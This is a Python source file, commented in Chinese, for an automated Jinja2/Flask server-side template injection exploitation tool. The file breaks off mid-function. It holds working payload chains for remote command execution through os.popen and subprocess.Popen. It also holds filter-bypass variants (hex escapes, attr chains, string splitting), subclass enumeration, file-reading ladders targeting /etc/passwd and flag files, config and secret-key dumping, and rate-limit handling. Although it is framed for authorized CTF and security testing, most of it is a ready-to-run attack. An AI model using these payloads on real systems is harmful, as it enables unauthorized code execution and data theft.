"""Jinja2 / Flask SSTI 检测与利用 —— 含过滤绕过与自适应阶梯。

功能（mode）：
- detect : 探针指纹（{{7*7}}/{{7*'7'}}/{{config}}）；探针被黑名单拦截时自动
          切换无数字探针（{{'a'~'a'}}/{{request}}）继续确认
- info   : {{config}} / {{request.environ}}（Werkzeug 2.x 起 environ 不含 os.environ）
- exec   : RCE 阶梯：入口链 × 取 os 两种方式 → 子类枚举二段式 → 绕过变体
          （attr 链、十六进制、空格括号、request.args 外带等）
- read_file : 4 级阶梯 + 过滤自适应：
    1) exec 链 cat 兜底（echo marker 包裹）
    2) builtins.open 对象图读取（含迭代器 __next__() 封 read 时）
    3) Flask open_resource（request.json_module._app，Flask≥2.2），黑名单场景
       自动切换空格括号 ( ) 变体 + ~ 拆片路径 + 迭代器读
    4) 路径 oracle 探测：open 不读泄露真实路径（文件对象 repr）→ 自动重读，
       并扫描常见 flag 路径（flag.txt//flag/app.py//etc/passwd 等）

过滤绕过机制（参考 2026 bugku CaaS1 题解）：
- 黑名单信号识别：响应含 Blacklisted/blocked/forbidden 等 → 'blocked'；
  响应含 too long 等 → 'too_long'；429/502 或 rate limit 文本 → 自动限速
- 长度限制：max_length 参数（如 70）超长 payload 自动跳过并切换紧凑变体
  （basename、扩展名拆片）；检测到 too_long 后同样切换紧凑策略
- '()' 相邻括号过滤 → f ( ) 空格括号等价写法
- 被封字符串 → 'a'~'b' 拼接拆片；显式黑名单词（blocked_words 参数）精确拆片，
  单字符黑名单词用 \\xHH 转义；'flag.txt' 类整名封禁 → 扩展名边界拆片
- 响应 HTML 实体（&#39;/&lt;/&gt;）先还原再判定与提取（Flask 自动转义）

仅用于授权 CTF / 安全测试环境。
"""
from __future__ import annotations

import asyncio
import os
import random
import re
import ssl
import string
import urllib.error
import urllib.parse
import urllib.request

from app.core.registry import register_tool
from app.core.tool import ParamSpec, Status, ToolResult
from tools.web.ssti_base import SstiEngineTool, parse_raw_http_request

# —— 响应判定特征 ——
ERROR_PATTERNS = [
    r"TemplateSyntaxError", r"jinja2\.exceptions", r"UndefinedError",
    r"Internal Server Error", r"Traceback \(most recent call last\)",
    r"Bad Request", r"werkzeug\.exceptions", r"<title>500",
]
BLOCKED_PATTERNS = [
    r"(?i)\bblocked\b", r"(?i)\bforbidden\b", r"(?i)\bblacklist",
    r"(?i)\bdenied\b", r"(?i)\bwaf\b",
]
TOO_LONG_PATTERNS = [r"(?i)too long", r"(?i)maximum length", r"(?i)too many characters"]
RATE_LIMIT_PATTERNS = [r"(?i)too many requests", r"(?i)rate limit"]

# 入口链：模板表达式 → 某个 Python 模块的 __globals__ 字典
ENTRY_CHAINS = {
    "self": "self.__init__.__globals__",
    "config": "config.__class__.__init__.__globals__",
    "lipsum": "lipsum.__globals__",
    "cycler": "cycler.__init__.__globals__",
    "joiner": "joiner.__init__.__globals__",
    "namespace": "namespace.__init__.__globals__",
    "url_for": "url_for.__globals__",
    "request.application": "request.application.__globals__",
}

# exec：入口 × 取 os 的两种方式（__builtins__ 为模块时走属性；为 dict 时走 ['os'] 键）
EXEC_TEMPLATES = [
    "{entry}.__builtins__.__import__('os').popen({cmd}).read()",
    "{entry}['os'].popen({cmd}).read()",
]

# exec 绕过变体（黑名单场景）。{cmd} 为 Jinja2 字符串表达式；needs_args 表示外带参数
EXEC_BYPASS = [
    # attr 过滤器链 + 'o'~'s' 拼接（封点号属性访问 / os、import 关键词；
    # popen/read 同样十六进制编码。Jinja2 的 attr 过滤器是裸 getattr 不回退字典键，
    # 所以 __globals__ 的 __builtins__ 走下标；Jinja2 3.x 中 | 优先级高于 []，
    # 链式结果取下标要加括号。__builtins__ 可能是模块也可能是字典，各给一个变体）
    ("attr 链+'o'~'s'",
     r"(self|attr('__init__')|attr('__globals__'))['__builtins__']|attr('__import__')('o'~'s')|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()",
     False),
    ("attr 链+'o'~'s'(dict)",
     r"(self|attr('__init__')|attr('__globals__'))['__builtins__']['__import__']('o'~'s')|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()",
     False),
    # \x6f\x73 十六进制（封 'os' 字样）
    ("十六进制 \\x6f\\x73",
     r"self.__init__.__globals__.__builtins__.__import__('\x6f\x73').popen({cmd}).read()",
     False),
    # 十六进制键 + attr 调用（封 os/import/popen/read 字样，运行时还原）
    ("十六进制键+attr",
     r"self.__init__.__globals__['\x6f\x73']|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()",
     False),
    # 空格括号（tokenizer 跳过空白，封相邻 '()' 时恢复调用）
    ("空格括号 f ( )",
     "self.__init__.__globals__.__builtins__.__import__('os').popen ( {cmd} ).read ( )",
     False),
    # request.args 外带（长度限制 / 引号过滤：命令与模块名都从 URL 参数取，模板零引号；
    # os.popen 不支持 shell 关键字，改用 subprocess.Popen；需 Flask 上下文）
    ("request.args 外带",
     "self.__init__.__globals__.__builtins__.__import__(request.args.m).Popen(request.args.a,shell=True,stdout=-1).communicate()[0].decode()",
     True),
]

# read_file：入口 × builtins.open
FILE_OPEN_TEMPLATES = [
    "{entry}.__builtins__.open({path}).read()",
    "{entry}.__builtins__['open']({path}).read()",
    "{entry}['__builtins__'].open({path}).read()",
    "{entry}['__builtins__']['open']({path}).read()",
]

# 封 read 时：文件对象是迭代器，__next__() 读首行
FILE_ITER_TEMPLATES = [
    "{entry}.__builtins__.open({path}).__next__()",
    "{entry}.__builtins__.open({path}).__iter__().__next__()",
]

# Flask ≥2.2：DefaultJSONProvider._app → Flask app → open_resource。
# 黑名单场景（封 read / 相邻 '()'）优先迭代器 + 空格括号变体
OPEN_RESOURCE_READ = [
    "request.json_module._app.open_resource ( {path} ).read ( )",
    "request.json_module._app.open_resource({path}).read()",
    "request.json_module._app.open_resource({path}).__next__( )",
    "request.json_module._app.open_resource ( {path} ).__next__ ( )",
    "request.json_module._app.open_resource({path}).__next__()",
]
OPEN_RESOURCE_READ_BLOCKED = [
    "request.json_module._app.open_resource({path}).__next__( )",
    "request.json_module._app.open_resource ( {path} ).__next__ ( )",
    "request.json_module._app.open_resource ( {path} ).read ( )",
    "request.json_module._app.open_resource({path}).read()",
    "request.json_module._app.open_resource({path}).__next__()",
]

# 先 open 不读：文件对象 repr 泄露真实路径（路径 oracle）
OPEN_RESOURCE_ORACLE = "request.json_module._app.open_resource({path})"

# 常见 flag 路径（oracle 探测清单）
FLAG_CANDIDATES = [
    "flag.txt", "flag", "/flag.txt", "/flag", "app.py", "/app/app.py",
    "/app/main.py", "/etc/passwd", "secret.txt",
]

PATH_IN_REPR = re.compile(r"name='([^']+)'")
FLAG_RE = re.compile(r"flag\{[^}]+\}", re.IGNORECASE)

_ENTITY_MAP = {
    "&#39;": "'", "&#x27;": "'", "&#34;": '"', "&#x22;": '"',
    "&lt;": "<", "&gt;": ">", "&amp;": "&", "&#x2F;": "/", "&#x5C;": "\\",
}


def _rand_marker() -> str:
    return "ssti_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _quote(s: str) -> str:
    """Jinja2 字符串字面量：按内容选引号，转义冲突。"""
    if "'" in s:
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
    return "'" + s + "'"


def _wrap_cmd(cmd: str, marker: str) -> str:
    return f"echo {marker};{cmd};echo {marker}"


def _html_unescape(text: str) -> str:
    """还原 Flask 自动转义 / HTML 实体，供判定与提取使用。"""
    for k, v in _ENTITY_MAP.items():
        text = text.replace(k, v)

    def _num(m: re.Match) -> str:
        cp = int(m.group(1))
        return chr(cp) if 32 <= cp < 0x110000 else m.group(0)

    return re.sub(r"&#(\d+);", _num, text)


# —— 过滤绕过：字符串拆片 ——
def _safe_piece(p: str, blocked_words: list[str]) -> str:
    """片段拆解：不含完整黑名单词 → 原样引用；否则按非单词字符拆，
    仍含词的部分按字符拆；单字符黑名单词用 \\xHH 转义。"""
    if not any(b in p for b in blocked_words):
        return _quote(p)
    subs = re.findall(r"\w+|[^\w]", p)
    out = []
    for sub in subs:
        if any(b in sub for b in blocked_words):
            for ch in sub:
                if ch in blocked_words:
                    out.append("'\\x%02x'" % ord(ch))
                else:
                    out.append(_quote(ch))
        else:
            out.append(_quote(sub))
    return "~".join(out)


def _obfuscate_str(s: str, blocked_words: list[str]) -> str:
    """黑名单词拆片：在所有词出现处切分，片段经 _safe_piece 处理，用 ~ 连接。"""
    blocked_words = [b for b in blocked_words if b]
    if not blocked_words:
        return _quote(s)
    cuts: set[int] = set()
    for b in blocked_words:
        start = 0
        while True:
            i = s.find(b, start)
            if i < 0:
                break
            cuts.add(i)
            cuts.add(i + len(b))
            start = i + 1
    if not cuts:
        return _quote(s)
    pieces, prev = [], 0
    for c in sorted(cuts):
        if c > prev:
            pieces.append(s[prev:c])
        prev = c
    if prev < len(s):
        pieces.append(s[prev:])
    return "~".join(_safe_piece(p, blocked_words) for p in pieces if p)


def _smart_split_path(path: str) -> str:
    """扩展名边界拆片：'/dir/flag.txt' → '/dir/flag'~'.txt'。
    规避 'flag.txt' 类整名黑名单，长度代价最小。"""
    m = re.match(r"^(.*?)([^/]*)$", path)
    if not m:
        return _quote(path)
    head, base = m.group(1), m.group(2)
    if "." in base:
        stem, _, ext = base.rpartition(".")
        return _quote(head + stem) + "~" + _quote("." + ext)
    return _quote(path)


def _char_split_all(path: str) -> str:
    """全部按字符拆（最后手段，规避一切词级黑名单）；长度代价大，注意 max_length。"""
    return "~".join(_quote(ch) for ch in path)


def _path_exprs(file_path: str, blocked_words: list[str], smart_mode: bool) -> list[str]:
    """候选路径表达式（去重保序）：黑名单场景 → 扩展名拆片(最紧凑) → 精确拆片；
    常规场景 → 原样。每种都含完整路径与 basename 紧凑形式。"""
    cands: list[str] = []
    if smart_mode or blocked_words:
        cands.append(_smart_split_path(file_path))
        if blocked_words:
            cands.append(_obfuscate_str(file_path, blocked_words))
        cands.append(_char_split_all(file_path))
    cands.append(_quote(file_path))
    base = os.path.basename(file_path)
    if base != file_path:
        if smart_mode or blocked_words:
            cands.append(_smart_split_path(base))
            if blocked_words:
                cands.append(_obfuscate_str(base, blocked_words))
            cands.append(_char_split_all(base))
        cands.append(_quote(base))
    return list(dict.fromkeys(cands))


def _fits(payload: str, max_length: int) -> bool:
    return max_length <= 0 or len(payload) <= max_length


class TargetUnresponsive(Exception):
    """连续空响应/连接失败熔断：目标疑似下线，中止后续尝试。"""


class _Pacer:
    """请求节流：检测到 429/502 或限速文本后自动放慢到 ≥1.5s；interval 为强制间隔。
    连续空响应/连接失败达到阈值时抛 TargetUnresponsive 熔断，避免在死靶机上空转。"""

    DEAD_THRESHOLD = 10

    def __init__(self, interval: float):
        self.interval = interval
        self.rate_limited = False
        self.dead_streak = 0

    async def send(self, http: "_Http", payload: str, extra_query: dict | None = None):
        status, body = http.send(payload, extra_query)
        if status in (429, 502) or any(re.search(p, body) for p in RATE_LIMIT_PATTERNS):
            self.rate_limited = True
            self.interval = max(self.interval, 1.5)
        # 熔断计数：网关 502 / 连接失败 +2（死信号），空响应 +1，正常响应清零；
        # 429 只放慢不计熔断（严格限速的活靶机会连续 429 后恢复）
        if status == 502 or status is None:
            self.dead_streak += 2
        elif not body.strip():
            self.dead_streak += 1
        elif status != 429:
            self.dead_streak = 0
        if self.dead_streak >= self.DEAD_THRESHOLD:
            raise TargetUnresponsive(
                "连续多次网关 502/空响应/连接失败，目标疑似下线、重启中或端口不通；"
                "请检查靶机连通性，或换用其他实例/端口")
        if self.interval:
            await asyncio.sleep(self.interval)
        return status, body


class _Http:
    """向注入点发送 payload（GET 走查询参数，POST 走表单），容忍自签名证书。"""

    def __init__(self, base_url: str, param: str, method: str, timeout: int = 10,
                 extra_params: str = "", headers: dict | None = None):
        self.base_url = base_url
        self.param = param
        self.method = method
        self.timeout = timeout
        self.extra_pairs = urllib.parse.parse_qsl(extra_params, keep_blank_values=True)
        # 原始数据包携带的请求头（含 Cookie/User-Agent/Content-Type），原样附带；
        # 剔除与单次请求绑定、会随 payload 变化的头（Content-Length/Transfer-Encoding）
        self.headers = {k: v for k, v in (headers or {}).items()
                        if k not in ("content-length", "transfer-encoding")}
        self._ctx = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode = ssl.CERT_NONE

    def send(self, payload: str, extra_query: dict | None = None) -> tuple[int | None, str]:
        # 注入参数排在最前（Flask request.form[key] 取第一个值），额外固定参数追加在后
        pairs = [(self.param, payload)] + list(self.extra_pairs)
        if self.method.upper() == "GET":
            qs = urllib.parse.urlencode(pairs)
            if extra_query:
                qs += "&" + urllib.parse.urlencode(extra_query)
            url = self.base_url + ("&" if "?" in self.base_url else "?") + qs
            data = None
        else:
            url = self.base_url
            if extra_query:
                url += ("&" if "?" in self.base_url else "?") + urllib.parse.urlencode(extra_query)
            data = urllib.parse.urlencode(pairs).encode()
        req_headers = dict(self.headers)
        req_headers.setdefault("User-Agent", "Mozilla/5.0 (CTF-SSTI-Tool)")
        req = urllib.request.Request(
            url, data=data, method=self.method.upper(),
            headers=req_headers,
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ctx) as resp:
                return resp.status, resp.read().decode(errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode(errors="replace")
        except Exception as exc:  # noqa: BLE001
            return None, f"[请求失败] {type(exc).__name__}: {exc}"


def _classify(body: str, baseline: str | None, status: int | None = None) -> str:
    """响应判定：ok / blocked(黑名单/WAF) / too_long / rate_limit / error /
    unchanged / empty / net_error。先还原 HTML 实体。"""
    if body.startswith("[请求失败]"):
        return "net_error"
    if not body.strip():
        return "empty"
    text = _html_unescape(body)
    if baseline is not None and text == _html_unescape(baseline):
        return "unchanged"
    if status in (429, 502) or any(re.search(p, text) for p in RATE_LIMIT_PATTERNS):
        return "rate_limit"
    for pat in BLOCKED_PATTERNS:
        if re.search(pat, text):
            return "blocked"
    for pat in TOO_LONG_PATTERNS:
        if re.search(pat, text):
            return "too_long"
    for pat in ERROR_PATTERNS:
        if re.search(pat, text):
            return "error"
    return "ok"


def _poc_line(payload: str) -> str:
    """在报告里附上实际发送的 payload，便于复制/调整。"""
    return f"  └─ POC: {payload}"


def _excerpt(body: str, limit: int = 3000) -> str:
    text = _html_unescape(body)
    text = re.sub(r"<[^>]+>", " ", text)
    text = re.sub(r"\s+", " ", text).strip()
    return text[:limit] + ("…" if len(text) > limit else "")


def _extract_between(body: str, marker: str) -> str | None:
    text = _html_unescape(body)
    i = text.find(marker)
    if i < 0:
        return None
    j = text.find(marker, i + len(marker))
    if j < 0:
        return None
    return text[i + len(marker):j].strip()


@register_tool
class SstiJinja2Tool(SstiEngineTool):
    name = "ssti_jinja2"
    description = ("Flask/Jinja2 SSTI:探针指纹、信息收集、万能链 RCE、子类枚举、"
                   "过滤绕过(拆片/空格括号/十六进制)、自适应文件读阶梯、路径 oracle")
    engine_key = "jinja2"
    engine_name = "Jinja2 / Flask"
    default_mode = "exec"
    version = "0.2.0"
    plan = (
        "CaaS1 式自适应:黑名单/超长/限速信号识别;~ 拆片('flag'~'.txt')、空格括号 f ( )、"
        "迭代器 __next__ ( ) 绕 read;open_resource 链 + 路径 oracle 自动定位 flag"
    )

    params = SstiEngineTool.params + [
        ParamSpec("blocked_words", type="text", required=False, default="",
                  description="已知黑名单词（逗号/换行分隔），payload 自动拆片规避"
                              "（如 flag.txt → 'flag'~'.txt'，ls → 'l'~'s'）"),
        ParamSpec("max_length", type="int", required=False, default=0,
                  description="注入点输入长度上限（如 70），0=不限；超长 payload 自动"
                              "跳过并切换紧凑变体（basename / 拆片）"),
        ParamSpec("interval", type="float", required=False, default=0,
                  description="请求间隔秒数（目标有限速时用）；检测到 429/502 自动 ≥1.5s"),
    ]

    # —— 工具入口 ——
    async def run(self, params: dict, ctx) -> ToolResult:
        extra_params = (params.get("extra_params") or "").strip()
        mode = params.get("mode", self.default_mode)
        command = params.get("command", "id")
        file_path = params.get("file_path", "/etc/passwd")
        custom_probe = params.get("probe") or ""
        custom_payload = params.get("payload") or ""
        blocked_words = [w.strip() for w in re.split(r"[\n,;]+", params.get("blocked_words") or "") if w.strip()]
        max_length = int(params.get("max_length") or 0)
        pacer = _Pacer(float(params.get("interval") or 0))
        signals: set[str] = set()

        report: list[str] = []
        raw = (params.get("raw_request") or "").strip()
        if raw:
            # —— 原始数据包模式：解析 URL/方法/请求头/参数，其余参数按原值固定附带 ——
            try:
                parsed = parse_raw_http_request(raw)
            except ValueError as exc:
                return ToolResult(status=Status.ERROR, stderr=f"原始数据包解析失败: {exc}")
            names = [n for n, _ in parsed["params"]]
            inject_param = (params.get("param") or "").strip()
            auto_pick = not inject_param
            inject_param = inject_param or (names[0] if names else "")
            if not inject_param:
                return ToolResult(status=Status.ERROR,
                                  stderr="原始数据包中没有可注入参数（查询串与表单均为空）")
            if inject_param not in names:
                return ToolResult(status=Status.ERROR,
                                  stderr=f"注入参数 {inject_param!r} 不在数据包参数中，可选: {', '.join(names)}")
            pkt_pairs = [(n, v) for n, v in parsed["params"] if n != inject_param]
            pkt_keys = {n for n, _ in pkt_pairs}
            merged = pkt_pairs + [(k, v) for k, v in
                                  urllib.parse.parse_qsl(extra_params, keep_blank_values=True)
                                  if k not in pkt_keys]
            http = _Http(parsed["url"], inject_param, parsed["method"],
                         extra_params=urllib.parse.urlencode(merged),
                         headers=parsed["headers"])
            shown = ", ".join(f"{n}={v if len(v) <= 24 else v[:21] + '…'}"
                              for n, v in parsed["params"])
            report.append(f"[原始包] {parsed['method']} {parsed['url']}")
            report.append(f"[原始包] 请求头 {len(parsed['headers'])} 个"
                          "（原样附带，含 Cookie/User-Agent/Content-Type）")
            report.append(f"[原始包] 参数: {shown or '(空)'}")
            report.append(f"[原始包] 注入参数: {inject_param}"
                          + ("（未指定，自动选第一个）" if auto_pick else "")
                          + "，其余按原值固定附带")
            if extra_params:
                report.append(f"[附加] 表单补充固定参数（数据包之外的键）: {extra_params}")
        else:
            http = _Http(params.get("target_url"), params.get("param"),
                         params.get("method", "POST"), extra_params=extra_params)
            if extra_params:
                report.append(f"[附加] 固定参数: {extra_params}")

        report.insert(0, f"[目标] {http.method} {http.base_url}（参数 {http.param}）")
        if blocked_words:
            report.append(f"[绕过] 已知黑名单词: {', '.join(blocked_words)}")
        if max_length > 0:
            report.append(f"[限制] 输入长度上限: {max_length}")

        try:
            base_status, baseline = await pacer.send(http, "__ssti_baseline_" + _rand_marker())
            base_cls = _classify(baseline, None, base_status)
            if base_cls in ("blocked", "too_long", "rate_limit"):
                # 基线标记串本身被过滤（如数字黑名单）——换空输入做渲染基线，并记录信号
                signals.add(base_cls)
                report.append(f"[基线] 标记串被过滤（{base_cls}）→ 注入点存在黑名单/长度过滤，改用空输入做渲染基线")
                base_status, baseline = await pacer.send(http, "")
            else:
                report.append(f"[基线] HTTP {base_status}，以此判定后续输入是否被渲染")
                if base_status is None or base_status >= 400 or base_cls in ("empty", "net_error"):
                    if base_status in (502,):
                        report.append("[基线] ⚠ 基线返回 502——网关异常，实例很可能已下线/重启中"
                                      "（连续 502 会自动熔断中止）")
                    elif base_status in (429,):
                        report.append("[基线] ⚠ 基线返回 429——目标限速中，已自动放慢请求节奏")
                    else:
                        report.append("[基线] ⚠ 基线响应异常——很可能请求结构不对：缺少必填表单字段"
                                      "（可在『额外固定参数』补上，如 team_name=x）、参数名错误或端点不接受该请求；"
                                      "此时后续判定不可靠，请先修正请求结构")

            if custom_payload:
                status, body = await pacer.send(http, custom_payload)
                cls = _classify(body, baseline, status)
                report.append(f"[自定义 payload] → HTTP {status} 判定={cls}")
                report.append(_poc_line(custom_payload))
                if cls == "ok":
                    report.append(f"  └─ 响应摘要: {_excerpt(body)}")
                data = {"engine": self.engine_key, "mode": mode, "success": cls == "ok",
                        "excerpt": _excerpt(body) if cls == "ok" else None}
                return ToolResult(status=Status.SUCCESS, stdout="\n".join(report) + "\n", data=data)

            if mode == "detect":
                data = await self._run_detect(http, baseline, custom_probe, report, pacer, signals)
            elif mode == "info":
                data = await self._run_info(http, baseline, report, pacer, signals)
            elif mode == "exec":
                data = await self._run_exec(http, baseline, command, report, pacer, signals,
                                            blocked_words, max_length)
            elif mode == "read_file":
                data = await self._run_read(http, baseline, file_path, report, pacer, signals,
                                            blocked_words, max_length)
            else:
                return ToolResult(status=Status.ERROR, stderr=f"未知模式: {mode}")
        except TargetUnresponsive as exc:
            report.append(f"[中止] {exc}")
            data = {"engine": self.engine_key, "mode": mode, "placeholder": False,
                    "success": False, "aborted": "target_unresponsive"}
            return ToolResult(status=Status.ERROR, stdout="\n".join(report) + "\n", data=data)

        if pacer.rate_limited:
            report.append("[限速] 目标出现限速响应，已自动放慢请求节奏")
        data.update({"engine": self.engine_key, "mode": mode, "placeholder": False})
        status = Status.SUCCESS
        if mode in ("exec", "read_file") and not data.get("success"):
            status = Status.ERROR
        return ToolResult(status=status, stdout="\n".join(report) + "\n", data=data)

    # —— detect：指纹确认（黑名单下自动换无数字探针） ——
    async def _run_detect(self, http: _Http, baseline: str, probe: str,
                          report: list[str], pacer: _Pacer, signals: set[str]) -> dict:
        if probe:
            status, body = await pacer.send(http, probe)
            cls = _classify(body, baseline, status)
            report.append(f"[自定义探针] {probe} → HTTP {status} 判定={cls}")
            if cls == "ok":
                report.append(f"  └─ 响应摘要: {_excerpt(body)}")
            return {"success": cls == "ok", "probes": [{"probe": probe, "hit": cls == "ok"}]}

        probes = [
            ("{{7*7}}", r"(?<![0-9])49(?![0-9])", "Jinja2/Twig/Nunjucks/AngularJS 系"),
            ("{{7*'7'}}", r"7777777", "Jinja2 特有（字符串乘）"),
            ("{{config}}", r"(SECRET_KEY|Config)", "Flask 上下文（config 对象）"),
        ]
        fallback_probes = [
            ("{{'a'~'a'}}", r"\baa\b", "Jinja2/Twig 字符串拼接（无数字，绕数字黑名单）"),
            ("{{request}}", r"Request", "Flask 上下文（request 对象，绕 config 黑名单）"),
        ]
        results, filtered = [], 0
        for template, pattern, meaning in probes:
            status, body = await pacer.send(http, template)
            cls = _classify(body, baseline, status)
            if cls in ("blocked", "too_long", "rate_limit"):
                signals.add(cls)
                filtered += 1
                report.append(f"[探针] {template} → HTTP {status} 判定={cls}（{meaning}）")
                continue
            hit = bool(re.search(pattern, body)) if body and not body.startswith("[") else False
            results.append({"probe": template, "hit": hit, "meaning": meaning})
            report.append(f"[探针] {template} → HTTP {status} 命中={'是' if hit else '否'}（{meaning}）")

        if filtered:
            report.append("[探测] 探针被过滤拦截，切换无数字/无关键词探针继续")
            for template, pattern, meaning in fallback_probes:
                status, body = await pacer.send(http, template)
                cls = _classify(body, baseline, status)
                if cls in ("blocked", "too_long", "rate_limit"):
                    signals.add(cls)
                    report.append(f"[探针] {template} → HTTP {status} 判定={cls}（{meaning}）")
                    continue
                hit = bool(re.search(pattern, body))
                results.append({"probe": template, "hit": hit, "meaning": meaning})
                report.append(f"[探针] {template} → HTTP {status} 命中={'是' if hit else '否'}（{meaning}）")

        j2_math = any(r["probe"] == "{{7*7}}" and r["hit"] for r in results)
        j2_mul = any(r["probe"] == "{{7*'7'}}" and r["hit"] for r in results)
        j2_concat = any(r["probe"] == "{{'a'~'a'}}" and r["hit"] for r in results)
        if j2_math and j2_mul:
            conclusion = "判定: 目标为 Jinja2/Flask（7*7 与 7*'7' 双命中）"
        elif j2_math:
            conclusion = "判定: 疑似通用 {{ }} 引擎（7*7 命中但 Jinja2 特有探针未命中，考虑 Twig/Nunjucks）"
        elif j2_concat:
            conclusion = "判定: Jinja2/Twig 语法激活（无数字探针命中；数字探针被过滤，注入点存在黑名单）"
        else:
            conclusion = "判定: 探针未命中，注入点可能未渲染、非该引擎或过滤极严"
        report.append(conclusion)
        return {"success": True, "probes": results, "conclusion": conclusion,
                "signals": sorted(signals)}

    # —— info：信息收集 ——
    async def _run_info(self, http: _Http, baseline: str, report: list[str],
                        pacer: _Pacer, signals: set[str]) -> dict:
        probes = [
            ("{{config}}", "Flask 配置（SECRET_KEY 等）"),
            ("{{request.environ}}", "WSGI 环境（注意: Werkzeug 2.x 起不含 os.environ）"),
        ]
        collected = {}
        for template, meaning in probes:
            status, body = await pacer.send(http, template)
            cls = _classify(body, baseline, status)
            if cls in ("blocked", "too_long", "rate_limit"):
                signals.add(cls)
            report.append(f"[信息] {template} → HTTP {status} 判定={cls}（{meaning}）")
            if cls == "ok":
                ex = _excerpt(body)
                collected[template] = ex
                report.append(f"  └─ {ex}")
            else:
                report.append(f"  └─ 未获取（{cls}）")
        return {"success": True, "collected": collected}

    # —— exec：RCE 阶梯（黑名单下提前断链 + 引导 read_file） ——
    async def _run_exec(self, http: _Http, baseline: str, command: str, report: list[str],
                        pacer: _Pacer, signals: set[str], blocked_words: list[str],
                        max_length: int, quiet_guidance: bool = False) -> dict:
        marker = _rand_marker()
        wrapped = _wrap_cmd(command, marker)
        cmd_expr = _obfuscate_str(wrapped, blocked_words) if blocked_words else _quote(wrapped)
        tried: list[dict] = []

        async def attempt(label: str, payload: str, extra_query: dict | None = None):
            if not _fits(payload, max_length):
                tried.append({"label": label, "class": "skipped", "len": len(payload),
                              "payload": payload})
                report.append(f"[exec] {label} → 跳过（长度 {len(payload)} > 上限 {max_length}）")
                return None, "skipped"
            status, body = await pacer.send(http, payload, extra_query)
            cls = _classify(body, baseline, status)
            if cls in ("blocked", "too_long", "rate_limit"):
                signals.add(cls)
            tried.append({"label": label, "class": cls, "status": status, "len": len(payload),
                          "payload": payload})
            report.append(f"[exec] {label}（{len(payload)} 字符）→ HTTP {status} 判定={cls}")
            report.append(_poc_line(payload))
            if cls != "ok":
                return None, cls
            out = _extract_between(body, marker)
            if out:
                report.append("  └─ 命中！命令输出:")
                for line in out.splitlines():
                    report.append(f"     {line}")
                return out, cls
            report.append("  └─ 响应变化但无标记输出（命令可能无回显）")
            return None, cls

        # 1) 入口链 × 取 os 方式
        blacklist_hits = 0
        for entry, ge in ENTRY_CHAINS.items():
            for tpl in EXEC_TEMPLATES:
                payload = "{{" + tpl.replace("{entry}", ge).replace("{cmd}", cmd_expr) + "}}"
                out, cls = await attempt(f"入口 {entry}", payload)
                if out is not None:
                    return {"success": True, "chain": entry, "output": out, "tried": tried}
                if cls in ("blocked", "too_long"):
                    blacklist_hits += 1
                else:
                    blacklist_hits = 0
                if blacklist_hits >= 2:
                    report.append("[exec] 连续命中黑名单/长度过滤，同类对象图链提前跳过（节省请求）")
                    break
            else:
                continue
            break

        # 2) 子类枚举二段式
        if "blocked" not in signals and "too_long" not in signals:
            out = await self._run_subclass_enum(http, baseline, wrapped, report, pacer, signals,
                                                attempt, tried, max_length)
            if out is not None:
                return {"success": True, "chain": "subclasses", "output": out, "tried": tried}
        else:
            report.append("[exec] 黑名单/长度过滤下跳过子类枚举（class/mro/subclasses 大概率被封）")

        # 3) 绕过变体
        for label, tpl, needs_args in EXEC_BYPASS:
            payload = "{{" + tpl.replace("{cmd}", cmd_expr) + "}}"
            out, _ = await attempt(label, payload, {"a": wrapped, "m": "subprocess"} if needs_args else None)
            if out is not None:
                return {"success": True, "chain": label, "output": out, "tried": tried}

        report.append("[exec] 全部链未命中。")
        if signals:
            report.append(f"[exec] 观察到的过滤信号: {', '.join(sorted(signals))}")
        if not quiet_guidance and (signals & {"blocked", "too_long"} or
                                   (max_length and all(t["class"] == "skipped" for t in tried))):
            report.append("[exec] 提示: 黑名单/长度过滤通常封死对象图 RCE 桥（__init__/__globals__/"
                          "__class__），最短 RCE 链也要 86+ 字符；但 open_resource 链不需要这些桥——")
            report.append("        建议改用 read_file 模式，配合路径 oracle 自动定位并读取 flag"
                          f"（open_resource 读链最短 57 字符{'' if not max_length else f'，≤{max_length} 可用' if max_length >= 57 else '，仍超上限时可单跑 oracle'}）。")
        return {"success": False, "chain": None, "output": None, "tried": tried,
                "hint": "建议 read_file 模式（open_resource 链 + 路径 oracle）"}

    # —— exec 二段式：子类枚举 ——
    async def _run_subclass_enum(self, http: _Http, baseline: str, wrapped: str,
                                 report: list[str], pacer: _Pacer, signals: set[str],
                                 attempt, tried: list[dict], max_length: int) -> str | None:
        probe = "{{''.__class__.__mro__[1].__subclasses__()}}"
        if not _fits(probe, max_length):
            report.append("[exec] 子类枚举探针超长，跳过二段式")
            return None
        status, body = await pacer.send(http, probe)
        cls = _classify(body, baseline, status)
        if cls in ("blocked", "too_long", "rate_limit"):
            signals.add(cls)
        if cls != "ok":
            report.append("[exec] 子类枚举 → 未取得子类列表，跳过二段式")
            report.append(_poc_line(probe))
            return None
        classes = re.findall(r"<class '([\w.]+)'>", body)
        if not classes:
            report.append("[exec] 子类枚举 → 无法解析子类 repr，跳过")
            return None
        target_idx, target_kind = None, None
        for idx, name in enumerate(classes):
            if name == "subprocess.Popen":
                target_idx, target_kind = idx, "Popen"
                break
            if name == "os._wrap_close":
                target_idx, target_kind = idx, "wrap_close"
                break
        if target_idx is None:
            report.append("[exec] 子类枚举 → 未找到 subprocess.Popen / os._wrap_close，跳过")
            return None
        report.append(f"[exec] 子类枚举 → 找到 {target_kind} @ index {target_idx}")
        if target_kind == "Popen":
            payload = (
                "{{''.__class__.__mro__[1].__subclasses__()[" + str(target_idx) + "]("
                + _quote(wrapped) + ",shell=True,stdout=-1).communicate()[0].decode()}}"
            )
        else:
            payload = (
                "{{''.__class__.__mro__[1].__subclasses__()[" + str(target_idx)
                + "].__init__.__globals__['popen'](" + _quote(wrapped) + ").read()}}"
            )
        out, _ = await attempt("子类枚举二段式", payload)
        return out

    # —— read_file：4 级阶梯 + 过滤自适应 ——
    async def _run_read(self, http: _Http, baseline: str, file_path: str, report: list[str],
                        pacer: _Pacer, signals: set[str], blocked_words: list[str],
                        max_length: int) -> dict:
